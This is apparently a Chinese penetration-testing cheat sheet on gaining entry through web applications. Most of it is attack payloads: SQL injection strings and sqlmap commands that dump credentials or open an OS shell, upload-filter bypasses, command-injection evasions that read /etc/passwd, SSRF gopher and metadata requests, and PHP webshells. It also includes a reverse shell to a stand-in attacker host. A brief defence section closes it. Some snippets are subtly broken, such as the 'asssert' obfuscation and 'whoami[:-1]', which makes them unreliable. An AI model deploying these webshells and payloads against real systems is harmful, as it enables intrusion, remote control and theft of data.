# Web服务入口突破

Web服务是渗透测试中最常见的入口点之一。本文档涵盖针对Web应用的攻击面识别和入口点获取技术。

## 1 Web攻击面评估

### 1.1 信息收集阶段

在尝试Web入口之前，需要收集以下信息：

| 信息类型 | 收集方法 | 工具示例 |
|----------|----------|----------|
| 域名/IP段 | DNS查询、WHOIS | dig, nslookup, whois |
| 子域名 | 暴力枚举、证书查询 | sublist3r, amass, ffuf |
| Web技术栈 | 指纹识别 | whatweb, wappalyzer |
| 开放端口 | 端口扫描 | nmap, masscan |
| Web目录 | 目录爆破 | dirb, gobuster, ffuf |

### 1.2 常见Web入口点

```
Web入口点分布:
├── 前台入口
│   ├── 登录页面（SQL注入、弱口令、暴力破解）
│   ├── 注册页面（短信/邮箱验证码绕过）
│   ├── 搜索功能（XSS、SQL注入）
│   ├── 评论/反馈功能（存储型XSS、SSRF）
│   └── API接口（未授权访问、越权漏洞）
│
├── 后台入口
│   ├── 管理后台（弱口令、CMS默认凭证）
│   ├── API管理接口
│   └── 监控/日志系统
│
└── 外部接口
    ├── Swagger/API文档
    ├── WebSocket接口
    └── 第三方集成接口
```

## 2 常见Web漏洞利用

### 2.1 SQL注入

#### 判断是否存在SQL注入

```bash
# 手动测试 - 字符串拼接
?id=1' AND 1=1 --+
?id=1' AND 1=2 --+

# 数字参数测试
?id=1 OR 1=1
?id=1' OR '1'='1

# 时间盲注测试
?id=1' AND SLEEP(5) --
?id=1' AND (SELECT 1 FROM (SELECT SLEEP(5))) --
```

#### SQL注入类型判断

| 类型 | 判断方法 | 示例 |
|------|----------|------|
| 布尔盲注 | 添加 AND/OR 条件，观察返回差异 | `id=1 AND 1=1` vs `id=1 AND 1=2` |
| 时间盲注 | 使用SLEEP()函数 | `id=1' AND SLEEP(5) --` |
| 报错注入 | 触发数据库错误 | `id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --` |
| 联合查询 | ORDER BY + UNION SELECT | `id=-1' UNION SELECT 1,2,3 --` |

#### SQLMap自动化利用

```bash
# 基本扫描
sqlmap -u "http://target.com/index.php?id=1"

# 指定数据库类型
sqlmap -u "http://target.com/index.php?id=1" --dbms=mysql

# 获取数据库列表
sqlmap -u "http://target.com/index.php?id=1" --dbs

# 获取表名
sqlmap -u "http://target.com/index.php?id=1" -D database_name --tables

# 获取列名
sqlmap -u "http://target.com/index.php?id=1" -D database_name -T table_name --columns

# dump数据
sqlmap -u "http://target.com/index.php?id=1" -D database_name -T table_name -C "username,password" --dump

# 写入文件（Out of Band）
sqlmap -u "http://target.com/index.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# 操作系统命令执行
sqlmap -u "http://target.com/index.php?id=1" --os-shell
```

### 2.2 文件上传漏洞

#### 常见上传绕过技巧

```bash
# 1. 文件名绕过
shell.php
shell.php3
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php\x00.jpg
shell.php0x00.jpg

# 2. MIME类型绕过
# Content-Type: image/jpeg 改为 application/x-php

# 3. 文件内容绕过
# 添加图片文件头
GIF89a
<?php system($_GET['cmd']); ?>

# 4. 竞争上传（时间竞争）
# 利用处理延迟完成上传

# 5. .htaccess/.user.ini 利用
# .htaccess: AddType application/x-httpd-php .jpg
# .user.ini: auto_prepend_file=shell.jpg
```

#### 常见上传点位置

```
上传功能位置:
├── 头像/证件上传
├── 附件上传
├── 文档转换上传
├── CMS媒体管理
├── 编辑器文件上传
│   ├── FCKeditor
│   ├── CKFinder
│   ├── eWebEditor
│   ├── KindEditor
│   └── UEditor
└── 备份文件导入
```

### 2.3 命令注入

#### 检测命令注入

```bash
# Ping功能测试
127.0.0.1 | whoami
127.0.0.1 && whoami
127.0.0.1; whoami
127.0.0.1 `whoami`
127.0.0.1 || whoami
```

#### 命令注入绕过

```bash
# 1. 空格绕过
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# 2. 关键字绕过
wh\oami
whoami[:-1]
$(echo d2hvYW1p | base64 -d)

# 3. 编码绕过
echo "d2hvYW1p" | base64 -d | bash

# 4. 利用已有命令
# 利用strings, awk, sed等
```

### 2.4 SSRF服务器端请求伪造

#### 常见触发点

```bash
# 1. URL图片读取
url=http://127.0.0.1:80
url=http://169.254.169.254/  # AWS元数据
url=file:///etc/passwd

# 2. URL跳转
url=http://外链.com -> 重定向到内网

# 3. PDF生成功能
# 读取内网服务并嵌入PDF

# 4. 缩略图生成
```

#### SSRF利用协议

```bash
# dict协议 - 读取敏感信息
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/get:index

# gopher协议 - 攻击Redis/MySQL等
gopher://127.0.0.1:6379/_SET%20test%20%22hacked%22

# file协议 - 读取本地文件
file:///etc/passwd
file:///proc/net/tcp

# http协议 - 探测内网
http://192.168.1.1:80
http://192.168.1.1:22
```

### 2.5 反序列化漏洞

#### PHP反序列化

```php
// 漏洞代码示例
$data = unserialize($_GET['data']);

// POP链构造
class A {
    public $obj;
    function __wakeup() {
        $this->obj->method();
    }
}

class B {
    public $cmd;
    function method() {
        eval($this->cmd);
    }
}
```

#### Java反序列化

```java
// 漏洞代码示例
ObjectInputStream.readObject();

// 常用 gadget
URLDNS (无需任何依赖)
Spring1 (Spring框架)
Rome (支持多种回显)
CB (原生Commons Beanutils)
```

### 2.6 认证绕过

#### Web管理后台绕过

```bash
# 1. 弱口令爆破
# 常见组合: admin/admin, admin/123456, admin/password

# 2. SQL注入绕过
admin' --
admin' OR '1'='1
' OR 1=1 --

# 3. 空口令
username: (空)
password: (空)

# 4. 默认凭证
# Tomcat: tomcat/tomcat
# JBoss: admin/admin
# WebLogic: weblogic/weblogic1
# phpMyAdmin: root/(空)
```

#### JWT令牌绕过

```bash
# 1. 算法修改 HS256 -> HS384/HS512
# 将alg改为none

# 2. 密钥混淆
# 使用public key作为密钥

# 3. 敏感信息泄露
# 解密查看是否有密钥

# JWT工具
jwt_tool.py <JWT token>
```

## 3 WebShell获取

### 3.1 常用WebShell

#### PHP WebShell

```php
<?php
// 简单一句话
eval($_POST['cmd']);
system($_POST['cmd']);
assert($_POST['cmd']);

// 冰蝎webshell
// 哥斯拉webshell

// 混淆示例
$s = substr('asssert', 1, 3);
$s($_POST['x']);
?>
```

#### 命令执行封装

```php
<?php
// 无回显命令执行
$fp = fopen('/tmp/cmd.txt', 'w');
fwrite($fp, $_POST['cmd']);
fclose($fp);

// 获取命令结果
$result = shell_exec($_POST['cmd']);
echo "<pre>$result</pre>";

// system()回显
system($_POST['cmd']);

// 反弹shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker/port 0>&1'");
?>
```

### 3.2 WebShell管理工具

| 工具 | 特点 | 连接方式 |
|------|------|----------|
| 冰蝎 | 加密传输,自带shell管理 | WebSocket |
| 哥斯拉 | 多协议支持,载荷丰富 | HTTP |
|蚁剑 | 开源,插件丰富 | HTTP |
| Cobalt Strike | 渗透测试平台 | SMB/Beacon |

## 4 API安全测试

### 4.1 REST API测试

```bash
# 基本请求
curl -X GET "http://target.com/api/users"
curl -X POST "http://target.com/api/users" -d '{"name":"test"}'

# 认证测试
curl -H "Authorization: Bearer <token>" http://target.com/api/admin

# 越权测试
# 水平越权: 改用户ID
curl "http://target.com/api/users/1001" -> 改为 /users/1002
# 垂直越权: 普通用户->管理员
```

### 4.2 GraphQL测试

```bash
#  introspection查询
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# 查询数据
curl -X POST http://target.com/graphql \
  -d '{"query":"query { user(id:\"1\") { name, email, password } }"}'
```

## 5 CMS漏洞利用

### 5.1 常见CMS指纹

| CMS | 默认后台 | 常见漏洞 |
|-----|----------|----------|
| WordPress | /wp-admin | 插件漏洞、主题漏洞、wp-admin未授权 |
| Drupal | /user/login | Drupalgeddon系列 |
| Joomla | /administrator | 组件漏洞、SQL注入 |
| SiteServer | /siteserver/login | 配置泄漏、注入 |
| 致远OA | /seeyon/ | 任意用户创建、文件上传 |

### 5.2 漏洞扫描工具

```bash
# CMS漏洞扫描
wpscan --url http://target.com --enumerate vp
python cmsmap.py http://target.com
python whatweb -v http://target.com

# 综合Web漏洞扫描
nikto -h http://target.com
dirb http://target.com /usr/share/wordlists/dirb/common.txt
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt http://target.com/FUZZ
```

## 6 防御措施

### 6.1 常用防护配置

```php
// PHP防护
ini_set('open_basedir', '/var/www/html/');
ini_set('disable_functions', 'system,exec,shell_exec,passthru,proc_open,popen');
magic_quotes_gpc = On;

// SQL防护 - 使用预编译
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// 文件上传防护
// 1. 白名单扩展名
// 2. 文件内容检测
// 3. 随机文件名
// 4. 上传目录不可执行
```

### 6.2 安全headers

```apache
# Apache/Nginx配置
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000"
```

## 7 参考资源

- OWASP Top 10
- SQLMap官方文档
- Web安全测试指南（PTES）
